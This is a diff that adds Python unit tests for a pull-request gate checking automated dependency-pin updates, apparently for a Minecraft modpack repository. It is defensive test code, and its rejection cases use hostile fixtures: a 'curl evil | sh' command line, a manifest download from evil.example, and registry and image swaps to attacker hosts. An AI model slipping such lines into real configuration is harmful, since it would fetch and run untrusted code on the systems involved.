@@ -289,6 +289,116 @@ class ModListLines(unittest.TestCase):
             self.assertNotRegex(line, gate.MOD_LIST_LINE)
 
 
+IMG = "    image: ${MIRROR_REGISTRY:-ghcr.io/piprees/mirrors}/"
+
+
+def platform_pr(files=None, commits=None):
+    """A platform-updates/auto PR built on fixture 26's shape (github-actions[bot], this repo)."""
+    pr, mod_commits, _, comments = load(26)
+    pr["head"]["ref"] = "platform-updates/auto"
+    if files is None:
+        files = [
+            {"filename": "docker-compose.yml", "status": "modified",
+             "patch": f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+{IMG}nginx:1.30.5-alpine\n"
+                      "-      FABRIC_LOADER_VERSION: ${FABRIC_LOADER_VERSION:-0.19.3}\n"
+                      "+      FABRIC_LOADER_VERSION: ${FABRIC_LOADER_VERSION:-0.19.5}"},
+            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified",
+             "patch": "@@ -4,2 +4,2 @@\n-loader_version=0.16.14\n+loader_version=0.19.5\n"
+                      "-fabric_version=0.115.0+1.21.1\n+fabric_version=0.116.15+1.21.1"},
+            {"filename": "mods/custom-dimensions/build-viewer-css.sh", "status": "modified",
+             "patch": '@@ -38 +38 @@\n-TAILWIND_VERSION="4.3.3"\n+TAILWIND_VERSION="4.4.0"\n'
+                      f'-    tailwindcss-linux-x64) echo "{"a" * 64}" ;;\n'
+                      f'+    tailwindcss-linux-x64) echo "{"b" * 64}" ;;'},
+            {"filename": "examples/consumer/.github/workflows/server-power.yml", "status": "modified",
+             "patch": "@@ -1 +1 @@\n-          DOCTL_VERSION: '1.175.0'\n+          DOCTL_VERSION: '1.176.0'"},
+        ]
+    return pr, commits if commits is not None else mod_commits, files, comments
+
+
+MANIFEST_BASE = {"dependencies": {"minecraft": "1.21.1", "fabric-loader": "0.19.3"}, "files": []}
+
+
+class PlatformSource(unittest.TestCase):
+    def run_gate(self, pr, commits, files, comments, manifests=(None, None)):
+        return gate.evaluate(pr, commits, files, comments, REPO, POLICY, manifests=manifests)
+
+    def test_accepted_and_smoked(self):
+        r = self.run_gate(*platform_pr())
+        self.assertTrue(r["ok"], r["reason"])
+        self.assertEqual(r["source"], "platform")
+        self.assertTrue(r["needs_smoke"])
+        self.assertIn("mods/custom-dimensions/gradle.properties", r["worldgen_paths"])
+
+    def test_manifest_loader_only(self):
+        files = [{"filename": "modpack/adventure.mrpack.json", "status": "modified",
+                  "patch": '@@ -1 +1 @@\n-    "fabric-loader": "0.19.3"\n+    "fabric-loader": "0.19.5"'}]
+        head = copy.deepcopy(MANIFEST_BASE)
+        head["dependencies"]["fabric-loader"] = "0.19.5"
+        r = self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))
+        self.assertTrue(r["ok"], r["reason"])
+        head["files"] = [{"downloads": ["https://evil.example/x.jar"]}]
+        r = self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))
+        self.assertIn("more than the fabric-loader", r["reason"])
+        head = copy.deepcopy(MANIFEST_BASE)
+        head["dependencies"]["fabric-loader"] = "0.20.0-beta.1"
+        self.assertIn("not a release version", self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))["reason"])
+
+    def assertRejected(self, fragment, files=None, commits=None, mutate=None):
+        pr, c, f, comments = platform_pr(files, commits)
+        if mutate:
+            mutate(pr, c, f)
+        r = self.run_gate(pr, c, f, comments)
+        self.assertFalse(r["ok"])
+        self.assertIn(fragment, r["reason"])
+
+    def test_file_outside_allowlist(self):
+        self.assertRejected("outside what platform-updates.yml", mutate=lambda pr, c, f: f.append(
+            {"filename": "scripts/deploy.sh", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}))
+
+    def test_added_file(self):
+        self.assertRejected("platform updates only modify", mutate=lambda pr, c, f: f[0].update(status="added"))
+
+    def test_non_pin_line(self):
+        self.assertRejected("not a platform pin", files=[{"filename": "docker-compose.yml", "status": "modified",
+                                                           "patch": "@@ -1 +1 @@\n+    command: curl evil | sh"}])
+
+    def test_mirror_registry_swap(self):
+        patch = f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+    image: ${{MIRROR_REGISTRY:-evil.example}}/nginx:1.30.5-alpine"
+        self.assertRejected("differ in more than their versions",
+                            files=[{"filename": "docker-compose.yml", "status": "modified", "patch": patch}])
+
+    def test_image_swap(self):
+        patch = f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+{IMG}evil/nginx:1.30.5-alpine"
+        self.assertRejected("differ in more than their versions",
+                            files=[{"filename": "docker-compose.yml", "status": "modified", "patch": patch}])
+
+    def test_added_pin_line(self):
+        patch = "@@ -1 +1,2 @@\n+loader_version=0.19.5"
+        self.assertRejected("differ in more than their versions", files=[
+            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified", "patch": patch}])
+
+    def test_minecraft_version_is_not_a_pin(self):
+        patch = "@@ -1 +1 @@\n-minecraft_version=1.21.1\n+minecraft_version=1.21.4"
+        self.assertRejected("not a platform pin", files=[
+            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified", "patch": patch}])
+
+    def test_human_commit(self):
+        _, commits, _, _ = platform_pr()
+        commits = copy.deepcopy(commits)
+        commits[0]["author"]["login"] = "piprees"
+        self.assertRejected("not an allowed bot", commits=commits)
+
+    def test_dependabot_cannot_use_the_branch(self):
+        self.assertRejected("not a recognised", mutate=lambda pr, c, f: pr["user"].update(login="dependabot[bot]"))
+
+    def test_extended_dependabot_paths(self):
+        self.assertTrue(gate.FILE_PATTERNS["actions"].match("examples/consumer/.github/workflows/deploy.yml"))
+        self.assertTrue(gate.FILE_PATTERNS["pip"].match("requirements-dev.txt"))
+        self.assertTrue(gate.FILE_PATTERNS["pip"].match("docker/kuma-init/requirements.txt"))
+        self.assertFalse(gate.FILE_PATTERNS["pip"].match("docker/kuma-init/Dockerfile"))
+        self.assertFalse(gate.FILE_PATTERNS["actions"].match("examples/other/.github/workflows/x.yml"))
+
+
 class FingerprintAndState(unittest.TestCase):
     def test_stable_under_reordering(self):
         pr, commits, files, comments = load(26)
